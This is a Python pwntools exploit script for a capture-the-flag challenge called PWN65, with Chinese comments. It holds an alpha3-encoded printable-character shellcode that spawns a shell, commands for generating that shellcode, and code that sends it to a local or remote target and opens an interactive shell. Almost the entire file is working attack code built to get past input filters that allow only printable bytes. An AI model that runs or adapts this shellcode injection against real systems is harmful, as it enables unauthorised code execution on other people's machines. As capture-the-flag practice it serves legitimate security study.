#!/usr/bin/env python3
"""
PWN65 - 可打印字符 shellcode exp
使用 alpha3 生成的可打印字符 shellcode
"""
from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'

# ============ 可打印字符 shellcode (由 alpha3 生成) ============
# 使用方法:
# 1. 生成原始 shellcode: python3 -c "from pwn import *; open('raw_sc.bin','wb').write(asm(shellcraft.sh()))"
# 2. 使用 alpha3 编码: cd /home/kk/ti/工具/alpha3_clean && python2 ALPHA3.py x64 ascii mixedcase rax --input=raw_sc.bin > encoded_sc.txt

# alpha3 生成的可打印字符 shellcode
PRINTABLE_SHELLCODE = b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"

print(f"[+] Shellcode 长度: {len(PRINTABLE_SHELLCODE)}")
print(f"[+] Shellcode 内容: {PRINTABLE_SHELLCODE}")

# 验证所有字符都在允许范围内 (0x30-0x7A)
allowed = set(range(0x30, 0x7B))
bad = [(i, b) for i, b in enumerate(PRINTABLE_SHELLCODE) if b not in allowed]
if bad:
    print(f"[!] 警告: 发现 {len(bad)} 个非法字符: {bad[:5]}...")
else:
    print("[+] 所有字符都在允许范围内!")

# ============ 连接目标 ============
LOCAL = True

if LOCAL:
    p = process('./pwn')
    # gdb.attach(p)  # 调试用
else:
    # 远程攻击时修改这里
    p = remote('ip', port)

# ============ 发送 payload ============
p.sendafter(b'Input you Shellcode', PRINTABLE_SHELLCODE)

# ============ 获取 shell ============
print("[+] 等待 shell...")
p.interactive()
